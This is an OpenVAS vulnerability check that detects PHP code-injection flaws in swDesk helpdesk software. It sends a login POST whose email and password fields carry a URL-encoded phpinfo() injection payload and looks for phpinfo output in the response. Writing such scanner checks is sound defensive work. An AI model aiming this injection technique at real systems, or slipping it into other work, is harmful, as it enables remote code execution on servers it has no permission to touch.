###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_swdesk_51792.nasl 11396 2018-09-14 16:36:30Z cfischer $
#
# swDesk Multiple Input Validation Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103425");
  script_bugtraq_id(51792);
  script_version("$Revision: 11396 $");
  script_name("swDesk Multiple Input Validation Vulnerabilities");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-14 18:36:30 +0200 (Fri, 14 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-02-16 13:08:33 +0100 (Thu, 16 Feb 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51792");
  script_xref(name:"URL", value:"http://www.swdesk.com/");

  script_tag(name:"summary", value:"swDesk is prone to the following vulnerabilities:

  1. An arbitrary file-upload vulnerability.

  2. Multiple cross-site scripting vulnerabilities.

  3. Multiple PHP code-injection vulnerabilities.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to execute arbitrary script code
  in the context of the affected site, steal cookie-based authentication credentials, upload arbitrary code,
  or inject and execute arbitrary code in the context of the affected application. This may facilitate a
  compromise of the application and the underlying system. Other attacks are also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

host = http_host_name( port:port );

foreach dir( make_list_unique( "/helpdesk", "/swdesk", "/swhelpdesk", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/signin.php";
  buf = http_get_cache( item:url, port:port );

  if( "Powered by swDesk" >< buf ) {

    req = string("POST ",url," HTTP/1.1\r\n",
                 "Host: ",host,"\r\n",
                 "Referer: http://",host,url,"\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: 74\r\n",
                 "\r\n",
                 "email=phpi%24%7B%40phpinfo%28%29%7D&password=phpi%24%7B%40phpinfo%28%29%7D\r\n");
    res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( "<title>phpinfo()" >< res ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );